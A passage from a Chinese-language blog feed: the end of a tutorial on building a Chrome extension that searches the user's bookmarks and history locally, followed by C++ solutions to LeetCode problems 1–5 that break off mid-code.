alt="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/56623319.jpg"></p><ul><li><p>manifest.json</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="attr">"manifest_version"</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">"content_security_policy"</span>: <span class="string">"script-src 'self' https://ajax.googleapis.com; object-src 'self'"</span>,</span><br><span class="line"></span><br><span class="line">  <span class="attr">"permissions"</span>: [</span><br><span class="line">    <span class="string">"bookmarks"</span>,// 访问 书签 权限</span><br><span class="line">    <span class="string">"history"</span>// 访问 历史记录权限</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="attr">"browser_action"</span>: &#123;</span><br><span class="line">    "default_title": "SearchAll",  // brower_action 名称（鼠标悬停显示）</span><br><span class="line">    "default_icon": "icon.png",   // 任务栏 图标</span><br><span class="line">    "default_popup": "popup.html"  // 弹框 样式</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>popup.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"bookmarks.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--加载 bookmarks脚本--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"history.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--加载 history脚本--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--输入框--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"search"</span>&gt;</span>Search:&amp;emsp;<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"search"</span> <span class="attr">autofocus</span>=<span class="string">"autofocus"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"records"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"bookmarks"</span> <span class="attr">id</span>=<span class="string">"label_marks"</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"bookmarks"</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span> <span class="comment">&lt;!--标签列表--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"history"</span> <span class="attr">id</span>=<span class="string">"label_history"</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"history"</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span><span class="comment">&lt;!--历史纪录列表--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>bookmarks.js</p><blockquote><p>通过getTree方法可以获得用户完整的书签树。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chrome.bookmarks.getTree(<span class="function"><span class="keyword">function</span>(<span class="params">bookmarkArray</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span> 对用户书签树进行处理，这里是将搜索到的每个连接加入到`id="bookmarks"`的&lt;ul&gt;中</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>点击链接，实现跳转</p><p>这里使用到<code>tabs</code>标签，chrome标签模块被用于和浏览器的标签系统交互。</p><p><a href="http://open.chrome.360.cn/extension_dev/tabs.html#method-create" target="_blank" rel="noopener">create</a> 和 <a href="http://open.chrome.360.cn/extension_dev/tabs.html#method-update" target="_blank" rel="noopener">update</a> 不需要申请<code>tabs</code>权限</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> li = $(<span class="string">'&lt;li&gt;'</span>);</span><br><span class="line"><span class="keyword">const</span> anchor = $(<span class="string">'&lt;a&gt;'</span>);</span><br><span class="line">anchor.attr(<span class="string">'href'</span>, bookmarkNode.url);</span><br><span class="line">anchor.text(bookmarkNode.title ? bookmarkNode.title : bookmarkNode.url);</span><br><span class="line">anchor.click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    chrome.tabs.create(&#123;<span class="attr">url</span>: bookmarkNode.url&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">li.append(anchor);</span><br></pre></td></tr></table></figure></li><li><p>history.js</p><blockquote><p>读取历史记录。Chrome提供了search和getVisits两种方法读取历史。通过search方法可以读取匹配指定文字，指定时间区间，指定条目的历史结果。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chrome.history.search(&#123;</span><br><span class="line">    text: <span class="string">'xxx'</span>,<span class="comment">// 筛选文本</span></span><br><span class="line">    startTime: <span class="keyword">new</span> <span class="built_in">Date</span>().getTime()<span class="number">-24</span>*<span class="number">3600</span>*<span class="number">1000</span>,</span><br><span class="line">    endTime: <span class="keyword">new</span> <span class="built_in">Date</span>().getTime(),<span class="comment">// 时间区间</span></span><br><span class="line">    maxResults: <span class="number">20</span><span class="comment">// 筛选数目</span></span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">historyItemArray</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 处理得到的历史纪律，同样添加到`id="history"`的&lt;ul&gt;中，并创建`tabs`标签，实现链接跳转</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><h3 id="最后一步"><a class="header-anchor" href="#最后一步" aria-hidden="true">¶</a> 最后一步</h3><ul><li><p>安装</p><p>将本地文件加载到chrome浏览器，可以进行调试</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/80438282.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/80438282.jpg"></p></li><li><p>打包</p><p>对本地文件进行封装，得到一个crx文件（扩展程序）和一个pem私钥文件（更新使用），得到crx文件，可以进行发布，提供给其他用户使用</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/21012087.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/21012087.jpg"></p></li><li><p>发布</p><p>太贵了，开发者验证要<code>$5.00</code>，而且只能发布20个程序，而且不支持支付宝微信银联</p><p>给个链接，自己看吧 —— <a href="https://chrome.google.com/webstore/developer/" target="_blank" rel="noopener">登录应用市场</a></p></li></ul><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.6.0/katex.min.css">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://images.gitee.com/uploads/images/2018/0929/165102_b3d93340_1543733.png&quot; alt=&quot;https://images.gitee.com/uploads/images/2018/0929/165102_b3d93340_1543733.png&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="chrome" scheme="http://www.danboard.me/categories/chrome/"/>
    
    
      <category term="js, extension" scheme="http://www.danboard.me/tags/js-extension/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode 1~10</title>
    <link href="http://www.danboard.me/LeetCode-1-10/"/>
    <id>http://www.danboard.me/LeetCode-1-10/</id>
    <published>2018-09-28T14:58:40.000Z</published>
    <updated>2018-09-29T14:16:37.333Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/65914867.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/65914867.jpg"></p><a id="more"></a><h2 id="1 两数之和"><a class="header-anchor" href="#1 两数之和" aria-hidden="true">¶</a> 1 两数之和</h2><ul><li>题目</li></ul><blockquote><p>给定一个整数数组和一个目标值，找出数组中和为目标值的两个数。</p><p>你可以假设每个输入只对应一种答案，且同样的元素不能被重复利用。</p><p><strong>示例:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; 给定 nums = [2, 7, 11, 15], target = 9</span><br><span class="line">&gt; </span><br><span class="line">&gt; 因为 nums[0] + nums[1] = 2 + 7 = 9</span><br><span class="line">&gt; 所以返回 [0, 1]</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>暴力循环</p><p>遍历每个元素x， 再查找是否存在一个target-x的值</p><p>时间复杂度：O(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>n</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">n^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:.8141079999999999em"></span><span class="strut bottom" style="height:.8141079999999999em;vertical-align:0"></span><span class="base textstyle uncramped"><span class="mord"><span class="mord mathit">n</span><span class="vlist"><span style="top:-.363em;margin-right:.05em"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span><span class="reset-textstyle scriptstyle uncramped"><span class="mord mathrm">2</span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0">​</span></span>​</span></span></span></span></span></span>)</p><p>空间复杂度：O(1)</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; twoSum(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;nums.size()<span class="number">-1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> d = target - nums[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=i+<span class="number">1</span>; j&lt;nums.size(); j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (d == nums[j]) &#123;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; res = &#123;i, j&#125;;</span><br><span class="line"><span class="comment">//res.push_back(i);</span></span><br><span class="line"><span class="comment">//res.push_back(j);</span></span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>STL ：<map></map></p><p>在进行迭代时，将值与坐标的映射关系存起来</p><p>通过target-x差值去查找在映射表中的位置</p><p>时间复杂度：O(n)</p><p>空间复杂度：O(n)</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; twoSum(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; m;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;nums.size(); i++) &#123;</span><br><span class="line"><span class="keyword">int</span> d = target - nums[i];</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; m.count(d) &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line"><span class="keyword">if</span> (m.count(d) &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;)&#123;m[d], i&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>m[nums[i]] = i;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="2 两数相加"><a class="header-anchor" href="#2 两数相加" aria-hidden="true">¶</a> 2 两数相加</h2><ul><li>题目</li></ul><blockquote><p>给定两个<strong>非空</strong>链表来表示两个非负整数。位数按照<strong>逆序</strong>方式存储，它们的每个节点只存储单个数字。将两数相加返回一个新的链表。</p><p>你可以假设除了数字 0 之外，这两个数字都不会以零开头。</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">&gt; 输出：7 -&gt; 0 -&gt; 8</span><br><span class="line">&gt; 原因：342 + 465 = 807</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>考虑 链表为空的情况</p><p>逐位相加，考虑进位 carry</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        ListNode *l3 = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode *p = l1, *q = l2, *curr = l3;</span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">NULL</span> || q != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> x = (p!=<span class="literal">NULL</span>) ? p-&gt;val : <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> y = (q!=<span class="literal">NULL</span>) ? q-&gt;val : <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> sum = x + y + carry;</span><br><span class="line">        carry = sum/<span class="number">10</span>;</span><br><span class="line">        curr-&gt;next = <span class="keyword">new</span> ListNode(sum%<span class="number">10</span>);</span><br><span class="line">        curr = curr-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (p != <span class="literal">NULL</span>)p = p-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (q != <span class="literal">NULL</span>)q = q-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (carry &gt; <span class="number">0</span>) &#123;</span><br><span class="line">curr-&gt;next = <span class="keyword">new</span> ListNode(carry);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> l3-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="3 无重复字符的最长子串"><a class="header-anchor" href="#3 无重复字符的最长子串" aria-hidden="true">¶</a> 3 无重复字符的最长子串</h2><ul><li>题目</li></ul><blockquote><p>给定一个字符串，找出不含有重复字符的<strong>最长子串</strong>的长度。</p><p><strong>示例 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;abcabcbb&quot;</span><br><span class="line">&gt; 输出: 3 </span><br><span class="line">&gt; 解释: 无重复字符的最长子串是 &quot;abc&quot;，其长度为 3。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;bbbbb&quot;</span><br><span class="line">&gt; 输出: 1</span><br><span class="line">&gt; 解释: 无重复字符的最长子串是 &quot;b&quot;，其长度为 1。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;pwwkew&quot;</span><br><span class="line">&gt; 输出: 3</span><br><span class="line">&gt; 解释: 无重复字符的最长子串是 &quot;wke&quot;，其长度为 3。</span><br><span class="line">&gt;      请注意，答案必须是一个子串，&quot;pwke&quot; 是一个子序列 而不是子串。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>将第一个字符作为新的字符串</p><p>遍历给定字符串，将不重复的字符添加进去，出现重复，从重复字符的下一个位置重新计算，比较子字符串大小</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (! s.empty())res += s[<span class="number">0</span>]; </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;s.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> index = res.find(s[i]);</span><br><span class="line">        <span class="keyword">if</span> (index &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (res.size() &gt; len)len = res.size();</span><br><span class="line">        res = res.substr(index+<span class="number">1</span>, s.size());</span><br><span class="line">&#125;</span><br><span class="line">res += s[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (res.size() &gt; len)len = res.size();</span><br><span class="line"><span class="keyword">return</span> len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4 两个排序数组的中位数"><a class="header-anchor" href="#4 两个排序数组的中位数" aria-hidden="true">¶</a> 4 两个排序数组的中位数</h2><ul><li>题目</li></ul><blockquote><p>给定两个大小为 m 和 n 的有序数组 <strong>nums1</strong> 和 <strong>nums2</strong> 。</p><p>请找出这两个有序数组的中位数。要求算法的时间复杂度为 O(log (m+n)) 。</p><p>你可以假设 <strong>nums1</strong> 和 <strong>nums2</strong> 不同时为空。</p><p><strong>示例 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; nums1 = [1, 3]</span><br><span class="line">&gt; nums2 = [2]</span><br><span class="line">&gt; </span><br><span class="line">&gt; 中位数是 2.0</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; nums1 = [1, 2]</span><br><span class="line">&gt; nums2 = [3, 4]</span><br><span class="line">&gt; </span><br><span class="line">&gt; 中位数是 (2 + 3)/2 = 2.5</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>第一种情况：一个数组为空，只要找另一个数组的中位数即可，数组长度为偶数，位置在[len/2-1,len/2]之间；奇数，在len/2。</p><p>第二种情况：两个数组都不为空</p><p>将两个数组合并，合并过程计数，只要找到中间位置len/2即可</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len1 = nums1.size();</span><br><span class="line">    <span class="keyword">int</span> len2 = nums2.size();</span><br><span class="line"><span class="keyword">if</span> (nums1.empty()) &#123;</span><br><span class="line"><span class="keyword">if</span> (len2%<span class="number">2</span>)<span class="keyword">return</span> nums2[len2/<span class="number">2</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> (nums2[len2/<span class="number">2</span><span class="number">-1</span>]+nums2[len2/<span class="number">2</span>])*<span class="number">1.0</span>/<span class="number">2</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums2.empty()) &#123;</span><br><span class="line"><span class="keyword">if</span> (len1%<span class="number">2</span>)<span class="keyword">return</span> nums1[len1/<span class="number">2</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> (nums1[len1/<span class="number">2</span><span class="number">-1</span>]+nums1[len1/<span class="number">2</span>])*<span class="number">1.0</span>/<span class="number">2</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>, j=<span class="number">0</span>, cnt=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> len = len1 + len2;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; num;</span><br><span class="line"><span class="keyword">while</span> (cnt &lt; len) &#123;</span><br><span class="line"><span class="keyword">if</span> (i &lt; len1 &amp;&amp; nums1[i] &lt;= nums2[j] || j == len2) &#123;</span><br><span class="line">num.push_back(nums1[i++]);</span><br><span class="line">cnt ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (j &lt;len2 &amp;&amp; nums1[i] &gt; nums2[j] || i == len1) &#123;</span><br><span class="line">                    num.push_back(nums2[j++]);</span><br><span class="line">cnt ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (cnt &gt; len/<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (len%<span class="number">2</span>)<span class="keyword">return</span> num[len/<span class="number">2</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> (num[len/<span class="number">2</span><span class="number">-1</span>]+num[len/<span class="number">2</span>])*<span class="number">1.0</span>/<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="5 最长回文子串"><a class="header-anchor" href="#5 最长回文子串" aria-hidden="true">¶</a> 5 最长回文子串</h2><ul><li>题目</li></ul><blockquote><p>给定一个字符串 <strong>s</strong>，找到 <strong>s</strong> 中最长的回文子串。你可以假设 <strong>s</strong> 的最大长度为1000。</p><p><strong>示例 1：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;babad&quot;</span><br><span class="line">&gt; 输出: &quot;bab&quot;</span><br><span class="line">&gt; 注意: &quot;aba&quot;也是一个有效答案。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 2：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;cbbd&quot;</span><br><span class="line">&gt; 输出: &quot;bb&quot;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>中心扩展法</p><p>回文中心一共有<code>2n-1</code>个(回文长度为偶数情况，中心在两个数之间)</p><p>奇数：<code>expandAroundCenter(s, i, i);</code></p><p>偶数：<code>expandAroundCenter(s, i, i+1);</code></p><p>计算最长回文的长度，更新最长回文的起点和终点，由此找到子字符串</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 